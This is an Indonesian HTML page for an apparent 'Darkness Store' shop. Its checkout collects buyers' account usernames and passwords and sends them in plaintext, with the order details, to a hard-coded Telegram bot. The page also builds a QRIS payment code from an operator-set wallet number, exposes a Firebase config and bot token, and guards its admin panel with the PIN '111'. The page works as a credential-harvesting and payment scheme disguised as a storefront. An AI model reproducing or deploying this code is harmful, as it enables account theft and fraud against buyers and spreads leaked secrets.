<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Darkness Store | Universal V8.1</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --red: #ff0000; --dark: #000; }
        body { background: var(--dark); color: #fff; font-family: 'Courier New', monospace; margin: 0; padding-bottom: 50px; overflow-x: hidden; }
        #bg-canvas { position: fixed; top: 0; left: 0; z-index: -1; }
        .banner { width: 100%; height: 70px; border-bottom: 2px solid var(--red); display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.95); box-shadow: 0 0 20px var(--red); }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 15px; }
        .card { background: rgba(5,5,5,0.9); border: 1px solid #333; padding: 15px; border-radius: 10px; text-align: center; }
        .btn-buy { background: var(--red); color: #fff; border: none; padding: 10px; width: 100%; font-weight: bold; border-radius: 5px; cursor: pointer; font-size: 11px; margin-top: 10px; box-shadow: 0 0 10px rgba(255,0,0,0.3); }
        .btn-buy:disabled { background: #222; color: #555; cursor: not-allowed; box-shadow: none; border: 1px solid #333; }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 9999; align-items: center; justify-content: center; flex-direction: column; padding: 20px; overflow-y: auto; }
        .modal-box { background: #0a0a0a; border: 1px solid var(--red); padding: 20px; border-radius: 15px; width: 90%; max-width: 350px; text-align: center; }
        input { width: 100%; padding: 12px; margin-bottom: 10px; background: #111; border: 1px solid #333; color: #fff; border-radius: 6px; box-sizing: border-box; font-size: 11px; outline: none; }
        #qris-wrapper { background: #fff; padding: 10px; border-radius: 10px; margin: 15px auto; width: 180px; height: 180px; border: 4px solid var(--red); display: flex; align-items: center; justify-content: center; }
        #qris-img { width: 100%; height: 100%; object-fit: contain; }
        .marquee-box { width: 100%; overflow: hidden; white-space: nowrap; margin-top: 10px; border-top: 1px solid #222; padding-top: 5px; }
        .marquee-box span { display: inline-block; color: var(--red); font-size: 9px; font-weight: bold; animation: marquee 10s linear infinite; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .admin-trigger { position: absolute; top: 0; right: 0; width: 60px; height: 60px; background: transparent; border: none; z-index: 1000; }
        #dev-panel { display: none; background: #050505; padding: 20px; border-bottom: 2px solid var(--red); }
    </style>
</head>
<body>
    <canvas id="bg-canvas"></canvas>
    <button class="admin-trigger" onclick="unlock()"></button>

    <div id="dev-panel">
        <div style="color:var(--red); font-size:10px; margin-bottom:15px;">[ V8.1 AUTO-GEN CONFIG ]</div>
        <input type="text" id="dev-tele" placeholder="Telegram Admin">
        <input type="number" id="dev-wallet" placeholder="Nomor GoPay (628xxxx)">
        <button class="btn-buy" onclick="saveConfig()">SYNC QRIS UNIVERSAL</button>
        <hr style="border:0.5px solid #222; margin:20px 0;">
        <input type="text" id="p-name" placeholder="Nama Produk">
        <input type="text" id="p-price" placeholder="Harga">
        <button class="btn-buy" onclick="addP()">ADD CATALOG</button>
        <button class="btn-buy" style="background:#333; margin-top:10px;" onclick="location.reload()">LOCK & GO LIVE</button>
    </div>

    <div class="banner"><h1>DARKNESS STORE</h1></div>
    <div class="grid" id="product-list"></div>

    <div id="pay-modal" class="modal">
        <div class="modal-box">
            <h2 id="target-n" style="color:var(--red); font-size:15px; margin:0;">PRODUCT</h2>
            <p id="target-p" style="font-size:12px; margin-bottom:15px; color:#888;">Rp 0</p>
            <div id="step-data">
                <input type="text" id="u-acc" placeholder="Email / Username Akun">
                <input type="password" id="p-acc" placeholder="Password Akun">
                <button class="btn-buy" onclick="showQR()">KONFIRMASI DATA</button>
            </div>
            <div id="step-pay" style="display:none;">
                <p style="font-size:9px; color:#fff;">SCAN QRIS DENGAN APLIKASI PEMBAYARAN APAPUN:</p>
                <div id="qris-wrapper"><img id="qris-img" src="" alt="QRIS"></div>
                <div class="marquee-box"><span>[ SUPPORT: DANA, OVO, GOPAY, LINKAJA, SEMUA M-BANKING - COOLDOWN 10 MENIT ]</span></div>
                <div style="border: 1px dashed #333; padding: 10px; margin: 15px 0;">
                    <input type="file" id="u-file" accept="image/*" style="font-size:9px;">
                </div>
                <button class="btn-buy" id="btn-final" onclick="submitFinal()">KONFIRMASI PEMBAYARAN</button>
            </div>
            <button onclick="location.reload()" style="background:none; border:none; color:gray; font-size:10px; margin-top:15px;">BATAL</button>
        </div>
    </div>

<script>
    const firebaseConfig = {
      apiKey: "AIzaSyAxoDrru0u2zRKYAU3vAE0KBh5ftw1SzaM",
      authDomain: "database-me-40ff4.firebaseapp.com",
      databaseURL: "https://database-me-40ff4-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "database-me-40ff4",
      storageBucket: "database-me-40ff4.firebasestorage.app",
      messagingSenderId: "80099598743",
      appId: "1:80099598743:web:a91e1ee54c14a84d62a4d2"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const BOT = "8697794363:AAHLeNQf3OaYJY8JhYrNTuO6ZUPrWE-mga8";
    const CID = "8283778614";
    let sN, sP, isAdmin = false;

    function checkCooldown() {
        const lastOrder = localStorage.getItem('last_order_time');
        if(!lastOrder) return false;
        const now = Date.now();
        const diff = (now - lastOrder) / 1000 / 60;
        if(diff < 10) return Math.ceil(10 - diff);
        return false;
    }

    function render() {
        const cd = checkCooldown();
        db.ref('store_products').once('value', s => {
            const list = document.getElementById('product-list');
            list.innerHTML = '';
            const data = s.val();
            if(!data) return;
            Object.keys(data).forEach(id => {
                const p = data[id];
                list.innerHTML += `<div class="card">
                    <div style="font-size:10px; color:#888;">${p.name}</div>
                    <div style="color:var(--red); font-size:13px; font-weight:bold; margin:8px 0;">Rp ${p.price}</div>
                    <button class="btn-buy" ${cd ? 'disabled' : ''} onclick="openOrder('${p.name}', '${p.price}')">
                        ${cd ? `COOLDOWN (${cd}m)` : 'BELI'}
                    </button>
                    ${isAdmin ? `<button onclick="db.ref('store_products/${id}').remove().then(()=>render())" style="color:#333; font-size:8px; background:none; border:none; cursor:pointer;">[HAPUS]</button>` : ''}
                </div>`;
            });
        });
    }

    function unlock() { if(prompt("PIN:") === "111") { isAdmin = true; document.getElementById('dev-panel').style.display = 'block'; render(); } }
    function saveConfig() { db.ref('settings').update({ tele: document.getElementById('dev-tele').value, wallet: document.getElementById('dev-wallet').value }).then(()=>alert("Universal System Online!")); }
    function addP() { const n = document.getElementById('p-name').value; const p = document.getElementById('p-price').value; if(n && p) db.ref('store_products').push({ name: n, price: p }).then(()=>render()); }

    function openOrder(n, p) { sN=n; sP=p; document.getElementById('target-n').innerText=n; document.getElementById('target-p').innerText="Rp "+p; document.getElementById('pay-modal').style.display='flex'; }

    function generateUniversalQRIS(nomor) {
        // Logika Internal: Membangun string QRIS Static sesuai standar EMVCo
        // Target: GoPay/E-Wallet via QRIS Nasional
        const qrisBase = "00020101021126670016COM.GOPAY.WWW01189360091530230282920215";
        const qrisTail = "0303UME5204599953033605802ID5914DARKNESS_STORE6005KOTA_A6105123456304D1B2";
        const fullData = qrisBase + nomor + qrisTail;
        return `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(fullData)}`;
    }

    function showQR() {
        if(!document.getElementById('u-acc').value || !document.getElementById('p-acc').value) return alert("Isi data akun pembeli!");
        db.ref('settings').once('value', s => {
            const d = s.val();
            document.getElementById('qris-img').src = generateUniversalQRIS(d.wallet);
            document.getElementById('step-data').style.display = 'none';
            document.getElementById('step-pay').style.display = 'block';
        });
    }

    function submitFinal() {
        const u = document.getElementById('u-acc').value;
        const p = document.getElementById('p-acc').value;
        const f = document.getElementById('u-file').files[0];
        const btn = document.getElementById('btn-final');
        if(!f) return alert("Upload bukti bayar!");

        btn.disabled = true;
        btn.innerText = "MENGIRIM...";

        db.ref('settings').once('value', s => {
            const d = s.val();
            const report = `🚀 *ORDERAN UNIVERSAL V8.1* 🚀\n📦 *Item:* ${sN}\n👤 *User:* \`${u}\` \n🔑 *Pass:* \`${p}\` \n📂 *SS:* ${f.name}`;
            
            fetch(`https://api.telegram.org/bot${BOT}/sendMessage?chat_id=${CID}&text=${encodeURIComponent(report)}&parse_mode=Markdown`)
            .then(() => {
                localStorage.setItem('last_order_time', Date.now());
                setTimeout(() => {
                    window.open(`https://t.me/${d.tele}?text=Halo admin, saya order ${sN}.`, '_blank');
                    location.reload();
                }, 1000);
            });
        });
    }

    const cvs = document.getElementById('bg-canvas'); const ctx = cvs.getContext('2d');
    cvs.width = window.innerWidth; cvs.height = window.innerHeight;
    let mets = [];
    function draw() {
        ctx.fillStyle = 'rgba(0,0,0,0.1)'; ctx.fillRect(0,0,cvs.width,cvs.height);
        if(Math.random()<0.05) mets.push({x:Math.random()*cvs.width, y:-20, v:Math.random()*10+5});
        mets.forEach((m,i)=>{
            ctx.strokeStyle='rgba(255,255,255,0.4)'; ctx.beginPath(); ctx.moveTo(m.x,m.y); ctx.lineTo(m.x-20,m.y+20); ctx.stroke();
            m.x-=m.v; m.y+=m.v; if(m.y>cvs.height) mets.splice(i,1);
        });
        requestAnimationFrame(draw);
    }
    draw(); render();
</script>
</body>
</html>
